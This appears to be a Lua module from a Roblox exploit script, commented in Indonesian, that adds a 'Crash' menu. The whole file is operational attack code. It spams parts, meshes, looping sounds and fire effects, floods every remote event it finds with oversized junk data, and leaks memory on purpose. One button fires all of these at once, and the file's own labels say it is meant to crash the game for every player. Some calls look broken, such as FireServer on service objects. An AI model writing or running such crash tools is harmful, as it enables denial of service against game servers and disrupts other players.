-- [VANZYXXX] SERVER CRASH MODULE
-- WARNING: Fitur ini bisa menyebabkan game crash, lag ekstrim, dan ban permanent
-- Gunakan dengan risiko sendiri!

local CrashModule = {
    Active = false,
    CrashMethods = {},
    SpammedInstances = {},
    IsCrashing = false
}

-- Inisialisasi Crash Module
function CrashModule:Init(UI, Services, Config, Theme)
    local tab = UI:Tab("Crash")
    
    tab:Label("⚠️ SERVER DESTROYER ⚠️")
    tab:Label("Fitur ini dapat menyebabkan:")
    tab:Label("- Game crash untuk semua player")
    tab:Label("- Lag ekstrim")
    tab:Label("- Ban permanent")
    tab:Label("- Server shutdown")
    
    -- ==============================================
    -- 1. MESH SPAMMER (Extreme Object Spam)
    -- ==============================================
    local meshSpamThread = nil
    local meshCount = 0
    
    tab:Toggle("Mesh Spammer Extreme", function(state)
        if state then
            meshCount = 0
            meshSpamThread = Services.RunService.Heartbeat:Connect(function()
                for i = 1, 50 do -- Spawn 50 mesh per frame
                    local part = Instance.new("Part")
                    part.Size = Vector3.new(10, 10, 10)
                    part.Position = Vector3.new(
                        math.random(-500, 500),
                        math.random(0, 100),
                        math.random(-500, 500)
                    )
                    part.Anchored = true
                    part.CanCollide = true
                    
                    -- Tambah mesh dengan detail tinggi
                    local mesh = Instance.new("SpecialMesh", part)
                    mesh.MeshType = Enum.MeshType.FileMesh
                    mesh.MeshId = "rbxassetid://94251442" -- Mesh kompleks
                    mesh.TextureId = "rbxassetid://94251465"
                    mesh.Scale = Vector3.new(5, 5, 5)
                    
                    -- Tambah lebih banyak detail
                    local sound = Instance.new("Sound", part)
                    sound.SoundId = "rbxasset://sounds/action_get_up.mp3"
                    sound.Looped = true
                    sound:Play()
                    
                    local fire = Instance.new("Fire", part)
                    fire.Size = 10
                    fire.Heat = 10
                    
                    part.Parent = Services.Workspace
                    table.insert(CrashModule.SpammedInstances, part)
                    meshCount = meshCount + 1
                    
                    -- Auto delete jika terlalu banyak
                    if #CrashModule.SpammedInstances > 1000 then
                        for j = 1, 100 do
                            if CrashModule.SpammedInstances[j] then
                                CrashModule.SpammedInstances[j]:Destroy()
                                table.remove(CrashModule.SpammedInstances, j)
                            end
                        end
                    end
                end
            end)
            
            Services.StarterGui:SetCore("SendNotification", {
                Title = "MESH SPAM ACTIVE",
                Text = "Spawning 50 meshes per frame...",
                Duration = 3
            })
        else
            if meshSpamThread then
                meshSpamThread:Disconnect()
                meshSpamThread = nil
            end
        end
    end)
    
    tab:Button("Cleanup Meshes", Theme.ButtonRed, function()
        for _, obj in pairs(CrashModule.SpammedInstances) do
            pcall(function() obj:Destroy() end)
        end
        CrashModule.SpammedInstances = {}
    end)
    
    -- ==============================================
    -- 2. SOUND FILE SPAMMER (RAM Destroyer)
    -- ==============================================
    local soundSpamThread = nil
    local soundIds = {
        "rbxassetid://9116398372", -- Sound panjang 1
        "rbxassetid://9116398373", -- Sound panjang 2
        "rbxassetid://9116398374", -- Sound panjang 3
        "rbxasset://sounds/musical_thunder_01.mp3",
        "rbxasset://sounds/action_falling.mp3",
        "rbxasset://sounds/action_get_up.mp3",
        "rbxasset://sounds/action_jump.mp3",
        "rbxasset://sounds/action_swim.mp3",
        "rbxasset://sounds/collide.mp3",
        "rbxasset://sounds/electronicpingshort.mp3"
    }
    
    tab:Toggle("Sound Spammer (RAM Killer)", function(state)
        if state then
            soundSpamThread = Services.RunService.Heartbeat:Connect(function()
                for i = 1, 20 do -- 20 sound per frame
                    local soundPart = Instance.new("Part")
                    soundPart.Size = Vector3.new(1, 1, 1)
                    soundPart.Position = Vector3.new(
                        math.random(-100, 100),
                        5,
                        math.random(-100, 100)
                    )
                    soundPart.Transparency = 1
                    soundPart.CanCollide = false
                    soundPart.Anchored = true
                    
                    local sound = Instance.new("Sound", soundPart)
                    sound.SoundId = soundIds[math.random(1, #soundIds)]
                    sound.Volume = 10 -- Volume maksimal
                    sound.Looped = true
                    sound.RollOffMaxDistance = 1000
                    sound.RollOffMinDistance = 0
                    sound:Play()
                    
                    soundPart.Parent = Services.Workspace
                    table.insert(CrashModule.SpammedInstances, soundPart)
                    
                    -- Buat lebih banyak instance sound dalam satu part
                    for j = 1, 5 do
                        local extraSound = Instance.new("Sound", soundPart)
                        extraSound.SoundId = soundIds[math.random(1, #soundIds)]
                        extraSound.Volume = 5
                        extraSound.Looped = true
                        extraSound:Play()
                    end
                end
            end)
        else
            if soundSpamThread then
                soundSpamThread:Disconnect()
                soundSpamThread = nil
            end
        end
    end)
    
    -- ==============================================
    -- 3. INFINITE LOOP EVENTS (Event Spammer)
    -- ==============================================
    local eventSpamThread = nil
    
    tab:Toggle("Infinite Event Spam", function(state)
        if state then
            eventSpamThread = Services.RunService.Heartbeat:Connect(function()
                -- Cari semua remote events/functions
                for _, obj in pairs(Services.Workspace:GetDescendants()) do
                    if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                        pcall(function()
                            if obj:IsA("RemoteEvent") then
                                obj:FireServer(
                                    math.random(),
                                    "crash",
                                    Vector3.new(math.random(), math.random(), math.random()),
                                    {data = "spam", count = 1000}
                                )
                            elseif obj:IsA("RemoteFunction") then
                                obj:InvokeServer("spam_data", {count = 500})
                            end
                        end)
                    end
                end
                
                -- Trigger custom events
                pcall(function()
                    game:GetService("ReplicatedStorage"):FireServer("AnyEvent", "spam")
                    game:GetService("Players"):FireServer("PlayerEvent", LocalPlayer)
                end)
            end)
        else
            if eventSpamThread then
                eventSpamThread:Disconnect()
                eventSpamThread = nil
            end
        end
    end)
    
    -- ==============================================
    -- 4. NETWORK PACKET FLOOD (Data Flood)
    -- ==============================================
    local packetFloodThread = nil
    
    tab:Toggle("Network Packet Flood", function(state)
        if state then
            packetFloodThread = Services.RunService.Heartbeat:Connect(function()
                -- Buat data besar untuk di-spam
                local hugeData = {}
                for i = 1, 1000 do
                    hugeData["key_" .. i] = string.rep("A", 1000) -- String 1000 karakter
                end
                
                -- Coba kirim ke berbagai endpoint
                pcall(function()
                    -- Ke ReplicatedStorage
                    local rs = game:GetService("ReplicatedStorage")
                    for _, child in pairs(rs:GetChildren()) do
                        if child:IsA("RemoteEvent") then
                            child:FireServer(hugeData)
                        end
                    end
                    
                    -- Ke LocalPlayer
                    for _, child in pairs(LocalPlayer:GetChildren()) do
                        if child:IsA("RemoteEvent") then
                            child:FireServer(hugeData)
                        end
                    end
                end)
            end)
        else
            if packetFloodThread then
                packetFloodThread:Disconnect()
                packetFloodThread = nil
            end
        end
    end)
    
    -- ==============================================
    -- 5. MEMORY LEAK GENERATOR (Lag Creator)
    -- ==============================================
    local leakThread = nil
    local leakTable = {}
    
    tab:Toggle("Memory Leak Generator", function(state)
        if state then
            leakThread = Services.RunService.Heartbeat:Connect(function()
                -- Buat table besar yang tidak pernah di-clear
                local hugeString = string.rep("MEMORY_LEAK_", 10000)
                for i = 1, 100 do
                    leakTable[#leakTable + 1] = {
                        data = hugeString .. i,
                        time = tick(),
                        nested = {
                            a = hugeString,
                            b = hugeString,
                            c = {hugeString, hugeString, hugeString}
                        }
                    }
                end
                
                -- Buat lebih banyak instance tersembunyi
                local hiddenPart = Instance.new("Part")
                hiddenPart.Name = "LeakPart_" .. tick()
                hiddenPart.Size = Vector3.new(1, 1, 1)
                hiddenPart.Transparency = 1
                hiddenPart.CanCollide = false
                hiddenPart.Parent = Services.Workspace
                
                -- Tambah banyak attribute
                for i = 1, 50 do
                    hiddenPart:SetAttribute("LeakAttr_" .. i, string.rep("X", 1000))
                end
                
                table.insert(CrashModule.SpammedInstances, hiddenPart)
            end)
        else
            if leakThread then
                leakThread:Disconnect()
                leakThread = nil
            end
        end
    end)
    
    -- ==============================================
    -- 6. ULTIMATE CRASH BUTTON (All Methods)
    -- ==============================================
    tab:Button("⚠️ ACTIVATE ALL CRASH METHODS ⚠️", Color3.fromRGB(255, 0, 0), function()
        UI:Confirm("AKTIFKAN SEMUA METODE CRASH?\nGame akan LAG/CRASH!", function()
            -- Aktifkan semua method
            CrashModule.IsCrashing = true
            
            -- Mesh Spammer
            local meshThread = Services.RunService.Heartbeat:Connect(function()
                for i = 1, 100 do
                    local part = Instance.new("Part")
                    part.Size = Vector3.new(50, 50, 50)
                    part.Position = Vector3.new(math.random(-1000, 1000), 50, math.random(-1000, 1000))
                    part.Parent = Services.Workspace
                    task.spawn(function()
                        for i = 1, 10 do
                            local mesh = Instance.new("SpecialMesh", part)
                            mesh.Scale = Vector3.new(10, 10, 10)
                            task.wait()
                        end
                    end)
                end
            end)
            
            -- Sound spam extreme
            for i = 1, 100 do
                task.spawn(function()
                    while CrashModule.IsCrashing do
                        local sound = Instance.new("Sound")
                        sound.SoundId = "rbxassetid://9116398372"
                        sound.Volume = 10
                        sound.Parent = Services.Workspace
                        sound:Play()
                        task.wait(0.01)
                    end
                end)
            end
            
            -- Network flood extreme
            while CrashModule.IsCrashing do
                pcall(function()
                    game:GetService("ReplicatedStorage"):FireServer("CRASH", string.rep("X", 10000))
                end)
                task.wait()
            end
        end)
    end)
    
    -- ==============================================
    -- 7. CLEANUP & SAFETY
    -- ==============================================
    tab:Button("🛑 EMERGENCY STOP 🛑", Color3.fromRGB(0, 255, 0), function()
        CrashModule.IsCrashing = false
        
        -- Stop semua thread
        if meshSpamThread then meshSpamThread:Disconnect() end
        if soundSpamThread then soundSpamThread:Disconnect() end
        if eventSpamThread then eventSpamThread:Disconnect() end
        if packetFloodThread then packetFloodThread:Disconnect() end
        if leakThread then leakThread:Disconnect() end
        
        -- Hapus semua instance
        for _, obj in pairs(CrashModule.SpammedInstances) do
            pcall(function() obj:Destroy() end)
        end
        CrashModule.SpammedInstances = {}
        
        -- Clear memory leak table
        leakTable = {}
        collectgarbage("collect")
        
        Services.StarterGui:SetCore("SendNotification", {
            Title = "CRASH STOPPED",
            Text = "All crash methods disabled",
            Duration = 3
        })
    end)
    
    -- Auto-cleanup on script close
    Config.OnReset:Connect(function()
        CrashModule.IsCrashing = false
        for _, obj in pairs(CrashModule.SpammedInstances) do
            pcall(function() obj:Destroy() end)
        end
    end)
end

-- Tambah ke feature loader
table.insert(FeatureList, {
    category = "Crash",
    name = "serverCrash",
    url = "internal/crashModule.lua"
})

-- Untuk load manual: CrashModule:Init(UI, Services, Config, Theme)
return CrashModule